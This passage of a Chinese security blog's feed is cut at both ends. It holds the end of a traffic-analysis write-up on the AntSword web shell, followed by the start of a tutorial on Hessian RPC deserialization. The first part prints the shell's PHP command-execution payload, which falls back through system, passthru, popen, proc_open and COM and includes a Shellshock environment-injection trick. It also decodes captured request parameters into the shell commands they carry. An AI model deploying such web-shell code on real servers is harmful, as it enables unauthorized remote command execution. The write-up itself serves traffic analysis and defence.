operator">&amp;&amp;</span> <span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'putenv'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error_log'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mail'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token function">readlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"bash"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">tempnam</span><span class="token punctuation">(</span><span class="token function">sys_get_temp_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'as'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// åˆ©ç”¨Shellshockæ¼æ´ï¼šé€šè¿‡ç¯å¢ƒå˜é‡æ³¨å…¥å‘½ä»¤</span>                <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PHP_LOL=() &#123; x; &#125;; <span class="token interpolation"><span class="token variable">$c</span></span> ><span class="token interpolation"><span class="token variable">$tmp</span></span> 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error_log'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token function">error_log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a@127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"-bv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$output</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">// æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å¤šç§å°è¯•æ–¹æ³•</span>    <span class="token keyword">function</span> <span class="token function-definition function">runcmd</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// æ–¹æ³•1: system()å‡½æ•°</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            @<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ–¹æ³•2: passthru()å‡½æ•°</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            @<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ–¹æ³•3: shell_exec()å‡½æ•°</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>@<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ–¹æ³•4: exec()å‡½æ•°</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$o</span><span class="token punctuation">,</span> <span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">,</span> <span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ–¹æ³•5: popen()å‡½æ•°</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'popen'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$fp</span> <span class="token operator">=</span> @<span class="token function">popen</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>@<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            @<span class="token function">pclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ–¹æ³•6: proc_open()å‡½æ•°</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'proc_open'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$p</span> <span class="token operator">=</span> @<span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pipe'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pipe'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$io</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>@<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>@<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            @<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            @<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            @<span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ–¹æ³•7: antsystem()å‡½æ•°ï¼ˆæŸäº›ç‰¹å®šç¯å¢ƒï¼‰</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'antsystem'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            @<span class="token function">antsystem</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ–¹æ³•8: å°è¯•Shellshockæ¼æ´åˆ©ç”¨</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">runshellshock</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ–¹æ³•9: Windows COMç»„ä»¶</span>        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">&amp;&amp;</span> @<span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"COM"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$w</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">COM</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'WScript.shell'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$e</span> <span class="token operator">=</span> <span class="token variable">$w</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$so</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">StdOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ret</span> <span class="token operator">.=</span> <span class="token variable">$so</span><span class="token operator">-></span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$se</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">StdErr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ret</span> <span class="token operator">.=</span> <span class="token variable">$se</span><span class="token operator">-></span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ‰€æœ‰æ–¹æ³•éƒ½å¤±è´¥</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>  <span class="token comment">// è¿”å›é”™è¯¯ä»£ç </span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">// æ‰§è¡Œå‘½ä»¤å¹¶æ•è·è¾“å‡º</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> @<span class="token function">runcmd</span><span class="token punctuation">(</span><span class="token variable">$r</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 2>&amp;1 å°†æ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">"ret=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$ret</span><span class="token punctuation">&#125;</span></span>"</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>  <span class="token comment">// å¦‚æœè¿”å›ç ä¸ä¸º0ï¼Œæ˜¾ç¤ºé”™è¯¯ä»£ç </span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ERROR://"</span> <span class="token operator">.</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŒæ ·æ˜¯å‚æ•°ä»ç¬¬ä¸‰ä¸ªå­—ç¬¦å¼€å§‹è§£ç </p><pre class="line-numbers language-none"><code class="language-none">f01dc94a142fc6&#x3D;S2&amp;i90659ac15e848&#x3D;o2L2Jpbi9zaA%3D%3D&amp;s34a4100eb3bde&#x3D;9aY2QgIi92YXIvd3d3L2h0bWwiO2xzO2VjaG8gNjExYzA5YTBkO3B3ZDtlY2hvIGQ0YzhkYzBjNzg%3D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/bin/sh<span class="token builtin class-name">cd</span> <span class="token string">"/var/www/html"</span><span class="token punctuation">;</span><span class="token function">ls</span><span class="token punctuation">;</span><span class="token builtin class-name">echo</span> 611c09a0d<span class="token punctuation">;</span><span class="token builtin class-name">pwd</span><span class="token punctuation">;</span><span class="token builtin class-name">echo</span> d4c8dc0c78<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>é‚£ä¹ˆç»“åˆè„šæœ¬ï¼Œæ‰§è¡Œçš„å®Œæ•´å‘½ä»¤æ˜¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/bin/sh <span class="token parameter variable">-c</span> <span class="token string">"cd <span class="token entity" title="\&quot;">\"</span>/var/www/html<span class="token entity" title="\&quot;">\"</span>;ls;echo 611c09a0d;pwd;echo d4c8dc0c78"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰€ä»¥ï¼Œåœ¨èšå‰‘çš„ç»ˆç«¯ä¸­ä½¿ç”¨ <code>&quot;</code> éœ€è¦å°å¿ƒï¼Œé¿å…å‡ºç°é—­åˆé—®é¢˜ï¼›ç„¶åå°±æ˜¯ç»å…¸çš„éšæœºç•Œå®šç¬¦æ¥è¾“å‡ºå½“å‰æ‰§è¡Œçš„ç›®å½•</p><hr><h1 id="å†°èæµé‡"><a href="#å†°èæµé‡" class="headerlink" title="å†°èæµé‡"></a>å†°èæµé‡</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/264896.html&quot;&gt;https://www.freebuf.com/articles/web/264896.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://forum.butian.net/index.php/share/1996&quot;&gt;https://forum.butian.net/index.php/share/1996&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="æµé‡åˆ†æ" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Hessianååºåˆ—åŒ–</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/11/17/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/11/17/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-11-16T17:39:29.000Z</published>
    <updated>2026-01-13T17:50:12.929Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¢«æˆ‘å¿˜æ‰çš„ Hessian ååºåˆ—åŒ– â€”â€” C1oudfL0w0 ç‰ˆï¼ˆ</p><p>å‚è€ƒï¼š</p><p><a href="https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://blog.potatowo.top/2024/11/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHessian/">https://blog.potatowo.top/2024/11/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHessian/</a></p><p><a href="https://zhuanlan.zhihu.com/p/621596752">https://zhuanlan.zhihu.com/p/621596752</a></p><p><a href="https://github.com/oldersheep/simple-hessian-rpc">https://github.com/oldersheep/simple-hessian-rpc</a></p><span id="more"></span><hr><h1 id="RPC-åè®®"><a href="#RPC-åè®®" class="headerlink" title="RPC åè®®"></a>RPC åè®®</h1><p>æ­¤äº‹åœ¨è®¡ç®—æœºæ“ä½œç³»ç»Ÿä¸­äº¦æœ‰è®°è½½</p><p>RPC å…¨ç§°ä¸º Remote Procedure Callï¼ˆè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰ï¼Œå®ƒå…è®¸ä¸€ä¸ªè®¡ç®—æœºç¨‹åºåœ¨å¦ä¸€å°è®¡ç®—æœºä¸Šæ‰§è¡Œä»£ç </p><p>ç±»ä¼¼äºä¹‹å‰çš„ RMIï¼Œéƒ½æ˜¯è¿œç¨‹è°ƒç”¨æœåŠ¡ï¼Œå®ƒä»¬çš„ä¸åŒä¹‹å¤„å°±æ˜¯ RPC é€šè¿‡æ ‡å‡†çš„äºŒè¿›åˆ¶æ ¼å¼æ¥å®šä¹‰è¯·æ±‚çš„ä¿¡æ¯ï¼Œè¿™æ ·è·¨å¹³å°å’Œç³»ç»Ÿæ›´åŠ æ–¹ä¾¿</p><p>å®ç°ï¼š</p><ol><li>å®šä¹‰æ¥å£ã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éœ€è¦å…±åŒå®šä¹‰ä¸€å¥—æ¥å£ï¼Œæè¿°å‡½æ•°çš„è¾“å…¥å‚æ•°å’Œè¿”å›å€¼ã€‚</li><li>ç”Ÿæˆä»£ç†ä»£ç ã€‚å®¢æˆ·ç«¯éœ€è¦ç”Ÿæˆä¸€ä¸ªä»£ç†ï¼Œå®ƒå¯ä»¥å°†å‡½æ•°è°ƒç”¨è½¬æ¢æˆç½‘ç»œæ¶ˆæ¯ï¼Œå¹¶å°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</li><li>åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´éœ€è¦å°†æ•°æ®åºåˆ—åŒ–æˆç½‘ç»œå­—èŠ‚æµï¼Œä»¥ä¾¿è¿›è¡Œä¼ è¾“ã€‚æ”¶åˆ°æ•°æ®åï¼Œéœ€è¦å°†å…¶ååºåˆ—åŒ–æˆå¯è¯»çš„æ•°æ®æ ¼å¼ã€‚</li><li>ç½‘ç»œä¼ è¾“ã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´éœ€è¦è¿›è¡Œç½‘ç»œä¼ è¾“ï¼Œä»¥ä¾¿è¿›è¡Œæ•°æ®äº¤æ¢ã€‚</li><li>è°ƒç”¨è¿œç¨‹å‡½æ•°ã€‚å®¢æˆ·ç«¯é€šè¿‡ä»£ç†è°ƒç”¨æœåŠ¡ç«¯çš„å‡½æ•°ï¼ŒæœåŠ¡ç«¯æ‰§è¡Œè¯¥å‡½æ•°å¹¶è¿”å›ç»“æœã€‚</li><li>è¿”å›ç»“æœã€‚æœåŠ¡ç«¯å°†æ‰§è¡Œç»“æœåºåˆ—åŒ–åå‘é€ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å°†å…¶ååºåˆ—åŒ–æˆå¯è¯»çš„æ•°æ®æ ¼å¼ã€‚</li></ol><p>ç›¸åº”çš„é€šä¿¡è¿‡ç¨‹ï¼š</p><ul><li>å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ï¼Œå¹¶æŒ‰ç…§RPCåè®®æ ¼å¼å¡«å……ä¿¡æ¯</li><li>å¡«å……å®Œæ¯•åå°†äºŒè¿›åˆ¶æ ¼å¼æ–‡ä»¶è½¬åŒ–ä¸ºæµï¼Œé€šè¿‡ä¼ è¾“åè®®è¿›è¡Œä¼ è¾“</li><li>æœåŠ¡ç«¯æ¥æ”¶åˆ°æµåï¼Œå°†å…¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ ¼å¼æ–‡ä»¶ï¼Œå¹¶æŒ‰ç…§RPCåè®®æ ¼å¼è·å–è¯·æ±‚çš„ä¿¡æ¯å¹¶è¿›è¡Œå¤„ç†</li><li>å¤„ç†å®Œæ¯•åå°†ç»“æœæŒ‰ç…§RPCåè®®æ ¼å¼å†™å…¥äºŒè¿›åˆ¶æ ¼å¼æ–‡ä»¶ä¸­å¹¶è¿”å›</li></ul><hr><h1 id="Hessian-åè®®"><a href="#Hessian-åè®®" class="headerlink" title="Hessian åè®®"></a>Hessian åè®®</h1><p>Hessian æ˜¯ä¸€ä¸ªåŸºäº RPC çš„é«˜æ€§èƒ½äºŒè¿›åˆ¶è¿œç¨‹ä¼ è¾“åè®®ï¼Œ<a href="http://hessian.caucho.com/">å®˜æ–¹</a>å¯¹ Javaã€Pythonã€C++ ç­‰è¯­è¨€éƒ½è¿›è¡Œäº†å®ç°ï¼ŒHessian ä¸€èˆ¬åœ¨WebæœåŠ¡ä¸­ä½¿ç”¨ã€‚</p><p>åœ¨ Java é‡Œå®ƒçš„ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œå®ƒå®šä¹‰è¿œç¨‹å¯¹è±¡ï¼Œå¹¶é€šè¿‡äºŒè¿›åˆ¶çš„æ ¼å¼è¿›è¡Œä¼ è¾“</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.caucho<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>hessian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.0.63<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç±»ä¼¼äº RMI çš„å½¢å¼ï¼ŒHessian éœ€è¦æœåŠ¡ç«¯å’Œæ¶ˆè´¹ç«¯é€šè¿‡æ¥å£ç›¸å…³è”ï¼ŒæœåŠ¡ç«¯å®ç°æ¥å£ï¼Œå½“ç„¶æ•°æ®åœ¨ç½‘ç»œä¼ è¾“ä¹‹åè¦è¿›è¡Œè¿˜åŸå°±éœ€è¦åºåˆ—å·</p><p>å†™ä¸€ä¸ª demoï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h1>]]></content>
    
    
